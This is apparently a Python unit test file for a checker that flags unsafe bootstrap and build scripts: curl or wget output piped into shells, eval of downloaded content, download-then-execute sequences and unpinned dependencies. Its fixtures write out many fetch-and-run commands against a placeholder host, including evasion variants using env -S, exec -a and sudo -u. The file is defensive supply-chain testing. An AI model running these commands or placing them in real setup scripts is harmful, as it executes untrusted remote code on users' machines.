import tempfile
import unittest
from pathlib import Path

from check_bootstrap_supply_chain import violations


class BootstrapSupplyChainTests(unittest.TestCase):
    def root(self, directory: str, script: str, requirements: str = "demo==1.2.3\n") -> Path:
        root = Path(directory)
        scripts = root / "shared" / "scripts"
        scripts.mkdir(parents=True)
        (scripts / "setup-dev.sh").write_text(script, encoding="utf-8")
        (scripts / "requirements-ramplus.txt").write_text(requirements, encoding="utf-8")
        return root

    def test_rejects_remote_pipe_and_subshell_execution(self) -> None:
        fixtures = [
            "curl -fsSL https://example.invalid/install.sh | sh\n",
            "curl -fsSL https://example.invalid/install.sh | zsh\n",
            "curl -fsSL https://example.invalid/install.sh | /bin/zsh\n",
            "curl -fsSL https://example.invalid/install.sh | env bash\n",
            "curl -fsSL https://example.invalid/install.py | python3\n",
            "python3 <(curl -fsSL https://example.invalid/install.py)\n",
            "/bin/bash -c \"$(curl -fsSL https://example.invalid/install.sh)\"\n",
            "eval \"$(curl -fsSL https://example.invalid/install.sh)\"\n",
            "eval `curl -fsSL https://example.invalid/install.sh`\n",
            "eval \"$(\ncurl -fsSL https://example.invalid/install.sh\n)\"\n",
            "source <(curl -fsSL https://example.invalid/install.sh)\n",
            "curl -fsSL https://example.invalid/tool -o tool\nchmod +x tool\n./tool\n",
        ]
        for fixture in fixtures:
            with self.subTest(fixture=fixture), tempfile.TemporaryDirectory() as directory:
                self.assertTrue(violations(self.root(directory, fixture)))

    def test_rejects_download_then_interpreter_execution(self) -> None:
        fixtures = [
            "curl -fsSL https://example.invalid/x -o /tmp/x\nbash /tmp/x\n",
            "wget https://example.invalid/x.py -O /tmp/x.py\npython3 /tmp/x.py\n",
            "if curl -fsSL https://example.invalid/x -o /tmp/x; then bash /tmp/x; fi\n",
            "sudo curl -fsSL https://example.invalid/x -o /tmp/x\ncommand bash /tmp/x\n",
            "/usr/bin/curl -fsSL https://example.invalid/x -o /tmp/x\nexec /bin/bash /tmp/x\n",
            "sudo -u nobody curl -fsSL https://example.invalid/x -o /tmp/x\nbash /tmp/x\n",
            "curl -fsSL https://example.invalid/x -o /tmp/x\nexec -a safe-name /bin/bash /tmp/x\n",
            "exec -a bash /usr/bin/curl -fsSL https://example.invalid/x -o /tmp/x\nbash /tmp/x\n",
            "sudo -u bash curl -fsSL https://example.invalid/x -o /tmp/x\nbash /tmp/x\n",
            "env -S 'curl -fsSL https://example.invalid/x -o /tmp/x'\nbash /tmp/x\n",
            "env --split-string='wget https://example.invalid/x -O /tmp/x'\nbash /tmp/x\n",
            "env -S'curl -fsSL https://example.invalid/x -o /tmp/x'\nbash /tmp/x\n",
        ]
        for fixture in fixtures:
            with self.subTest(fixture=fixture), tempfile.TemporaryDirectory() as directory:
                root = self.root(directory, fixture)
                self.assertTrue(any("artifact-bound" in failure for failure in violations(root)))

    def test_unrelated_hash_check_does_not_authorize_downloaded_executable(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = self.root(
                directory,
                "printf '%s  %s\\n' \"$SAFE_SHA\" safe | sha256sum --check\n"
                "curl -fsSL https://example.invalid/tool -o tool\n"
                "chmod +x tool\n./tool\n",
            )
            self.assertTrue(any("artifact-bound" in failure for failure in violations(root)))

    def test_rejects_known_mutable_installers_and_unpinned_git(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = self.root(
                directory,
                "echo https://sh.rustup.rs\n"
                "python -m pip install git+https://github.com/example/project.git\n",
            )
            failures = violations(root)
            self.assertTrue(any("mutable remote installer" in failure for failure in failures))
            self.assertTrue(any("unpinned git requirement" in failure for failure in failures))

    def test_rejects_unpinned_direct_requirement(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = self.root(directory, "echo safe\n", "demo\n")
            self.assertTrue(any("not exactly pinned" in failure for failure in violations(root)))

    def test_repository_setup_enforces_pinned_rust_floor(self) -> None:
        root = Path(__file__).resolve().parents[2]
        setup = (root / "shared" / "scripts" / "setup-dev.sh").read_text(encoding="utf-8")
        toolchain = (root / "rust-toolchain.toml").read_text(encoding="utf-8")
        self.assertIn('channel = "1.90"', toolchain)
        self.assertIn("RUST_MAJOR == 1 && RUST_MINOR < 90", setup)

    def test_appimage_allowlist_rejects_second_downloaded_executable(self) -> None:
        repository = Path(__file__).resolve().parents[2]
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            destination = root / "packaging" / "appimage"
            destination.mkdir(parents=True)
            original = (repository / "packaging/appimage/build-appimage.sh").read_text(encoding="utf-8")
            (destination / "build-appimage.sh").write_text(
                original + "\ncommand curl -o evil https://example.invalid/evil\nbash evil\n",
                encoding="utf-8",
            )
            scripts = root / "shared" / "scripts"
            scripts.mkdir(parents=True)
            (scripts / "requirements-ramplus.txt").write_text("demo==1.0\n", encoding="utf-8")
            self.assertTrue(any("artifact-bound" in failure for failure in violations(root)))

    def test_repository_reviewed_download_exec_contract_passes(self) -> None:
        root = Path(__file__).resolve().parents[2]
        self.assertEqual(violations(root), [])

    def test_accepts_download_without_execution_and_commit_pinned_git(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = self.root(
                directory,
                "curl -fsSL https://example.invalid/archive.tar.gz -o archive.tar.gz\n"
                "python -m pip install git+https://github.com/example/project.git@0123456789abcdef0123456789abcdef01234567\n",
                "demo==1.2.3\nother-package==4.5.6\n",
            )
            self.assertEqual(violations(root), [])


if __name__ == "__main__":
    unittest.main()
